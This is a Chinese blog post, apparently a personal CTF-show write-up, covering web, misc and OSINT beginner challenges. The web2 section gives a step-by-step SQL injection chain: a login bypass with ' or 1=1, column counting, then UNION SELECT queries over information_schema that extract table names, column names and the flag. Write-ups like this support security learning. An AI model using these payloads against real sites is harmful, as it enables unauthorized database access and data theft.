@@ -1,0 +1,215 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>CTF-show · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2023-12-24">2023年12月24日</time>
+        
+        
+          <span class="post__readtime">2 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/CTF-show/">#CTF-show</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">CTF-show</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <h1 id="WEB板块"><a href="#WEB板块" class="headerlink" title="WEB板块"></a>WEB板块</h1><h3 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h3><p>查看源码</p>
+<p><img src="/../img/Typora/image-20231224220027252.png" alt="image-20231224220027252"></p>
+<p>base64解码</p>
+<p><img src="/../img/Typora/image-20231224220039665.png" alt="image-20231224220039665"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;6d8d8144-c200-4f8e-801c-23b7a1cd2403&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>用户名输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1 -- a //成功登录</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231224221731932.png" alt="image-20231224221731932"></p>
+<p>判断字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1 order by 3 -- a //页面正常</span><br><span class="line">&#x27; or 1=1 order by 4 -- a //页面不正常</span><br><span class="line"></span><br><span class="line">	判断有3个字段</span><br></pre></td></tr></table></figure>
+
+<p>判断回显位</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or 1=2 union select 1,2,3 -- a //页面出现2，数字2处为回显位</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231224222223677.png" alt="image-20231224222223677"></p>
+<p>爆库名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or 1=2 union select 1,database(),3 -- a&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/../img/Typora/image-20231224222241986.png" alt="image-20231224222241986"></p>
+<p>爆表名</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1 -- a&#x27; //爆出flag表</span><br><span class="line"></span><br><span class="line">&#x27;or 1=2 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 1,1 -- a&#x27; //爆出user表</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231224222604815.png" alt="image-20231224222604815"></p>
+<p><img src="/../img/Typora/image-20231224222823142.png" alt="image-20231224222823142"></p>
+<p>爆字段</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or 1=2 union select 1,column_name,3 from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27; limit 0,1 -- a&#x27; //爆出flag字段</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231224223104702.png" alt="image-20231224223104702"></p>
+<p>看内容</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or 1=2 union select 1,flag,3 from flag limit 0,1 -- a&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../img/Typora/image-20231224223208961.png" alt="image-20231224223208961"></p>
+<p>ctfshow{1a5480d6-f6a8-4787-85fc-a2382f9ac937}</p>
+<h3 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h3><p>不会，先放着</p>
+<h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><h1 id="Misc板块"><a href="#Misc板块" class="headerlink" title="Misc板块"></a>Misc板块</h1><h3 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h3><p>用010 Editor打开，发现是伪加密，将09改为00</p>
+<p><img src="/../img/Typora/image-20231224225519748.png" alt="image-20231224225519748"></p>
+<p>然后就能正常打开了</p>
+<p><img src="/../img/Typora/image-20231224225556417.png" alt="image-20231224225556417"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;79ddfa61bda03defa7bfd8d702a656e4&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="网络迷踪板块"><a href="#网络迷踪板块" class="headerlink" title="网络迷踪板块"></a>网络迷踪板块</h1><h3 id="新手上路"><a href="#新手上路" class="headerlink" title="新手上路"></a>新手上路</h3><p>附件一张.jpg图片，题目说flag为桥的名字</p>
+<p><img src="/../img/Typora/image-20231224224146833.png" alt="image-20231224224146833"></p>
+<p>百度识图找到桥所在的岛的名字</p>
+<p><img src="/../img/Typora/image-20231224224221274.png" alt="image-20231224224221274"></p>
+<p>百度搜出桥的名字</p>
+<p><img src="/../img/Typora/image-20231224224245178.png" alt="image-20231224224245178"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2023/12/26/%E5%9F%BA%E7%A1%80/C%E8%AF%AD%E8%A8%80%E7%AC%94%E8%AE%B0/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">C语言笔记</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2023/12/23/%E5%9F%BA%E7%A1%80/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">zkaq-数据库注入</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
